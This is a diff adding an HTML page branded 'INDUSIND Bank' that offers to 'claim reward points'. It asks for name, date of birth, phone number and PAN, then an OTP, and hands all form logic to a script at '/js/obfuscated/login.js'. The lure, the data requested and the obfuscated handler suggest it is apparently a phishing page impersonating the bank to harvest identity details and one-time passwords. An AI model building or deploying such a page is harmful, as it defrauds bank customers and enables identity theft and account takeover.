@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INDUSIND Bank</title>
+    <!-- <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet"> -->
+    <script src="https://cdn.tailwindcss.com"></script> 
+    <!-- <link rel="stylesheet" href="/styles.css"> -->
+    <style>
+        .error-message {
+            color: red;
+            font-size: 0.8rem;
+            margin-top: 0.25rem; 
+        }
+        #countryCode {
+            display: none;
+        }
+
+    </style>
+        <style>
+            .error-message {
+                color: red;
+                font-size: 0.875em;
+            }
+            .relative {
+                position: relative;
+            }
+            .placeholder {
+                position: absolute;
+                top: 50%;
+                left: 12px;
+                transform: translateY(-50%);
+                /* background-color: rgb(139, 133, 133); */
+                pointer-events: none;
+                color: #b8adad;
+            }
+            .hidden {
+                display: none;
+            }
+        </style>
+
+</head>
+<body>
+    <div class="container mx-auto mt-10">
+        <div class="flex justify-center">
+            <div class="w-full max-w-md p-4 rounded-md shadow-sm">
+                <div class="text-center mb-12">
+                    <img src="/images/logo.png" alt="Logo" class="w-100 h-20 mx-auto mb-8">
+                    <h1 class="text-s ">Fill the details to claim reward points</h1>
+                </div>
+
+                <form id="login-form">
+                    <div class="mb-4">
+                        <label for="name" class="block text-gray-700 ">Name:</label>
+                        <input type="text" id="name" class="w-full px-3 py-2 border border-red-500 rounded focus:outline-none focus:border-blue-500" required>
+                        <div id="nameError" class="error-message"></div>
+                    </div>
+
+                    <div class="mb-4">
+                        <label for="dob" class="block text-gray-700">DOB:</label>
+                        <div class="relative flex items-center">
+                            <div class="w-full relative">
+                                <div id="dobDisplay" class="placeholder">DD/MM/YYYY</div>
+                                <input type="date" id="dob" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" required>
+                            </div>
+                        </div>
+                        <div id="dobError" class="error-message"></div>
+                    </div>
+                    
+                    <div class="mb-4"> 
+                        <div class="w-1/4 mr-2">
+                            <label for="countryCode" class="block text-gray-700 "></label>
+                            <select id="countryCode" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline">
+                                <option value="+91">+91</option>
+                            </select>
+                        </div>
+                        <div class="">
+                            <label for="phoneNumber" class="block text-gray-700 ">Phone Number:</label>
+                            <input type="text" id="phoneNumber" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" required>
+                        </div>
+                        <div id="phoneError" class="error-message"></div>
+                    </div>
+
+                    <div class="mb-4">
+                        <label for="pan" class="block text-gray-700 ">PAN:</label>
+                        <input type="text" id="pan" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" required>
+                        <div id="panError" class="error-message"></div>
+                    </div>
+                    <button type="button" onclick="sendOTP()" class="hover:border bg-my-primary hover:border-my-primary hover:text-my-primary hover:border-my-primary hover:bg-white text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline">Send OTP</button>
+
+
+                    
+                </form>
+                <form id="otp-form" style="display: none;">
+                    <div class="mb-4">
+                        <label for="otp" class="block text-gray-700 font-bold mb-2">Enter OTP:</label>
+                        <input type="text" id="otp" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" required>
+                        <div id="otpError" class="error-message"></div>
+                    </div>
+                    <div class="flex justify-between w-full">
+                    <button type="button" id="verifyButton" onclick="verifyOTP()" class="hover:border bg-my-primary hover:border-my-primary hover:text-my-primary hover:border-my-primary hover:bg-white text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline">Verify OTP</button>
+                    <a onclick="resendOTP()" class="hover:border hover:border-my-primary hover:text-my-primary text-my-primary font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline cursor-pointer">Resend OTP</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script src="/js/obfuscated/login.js"></script>
+
+</body>
+</html>
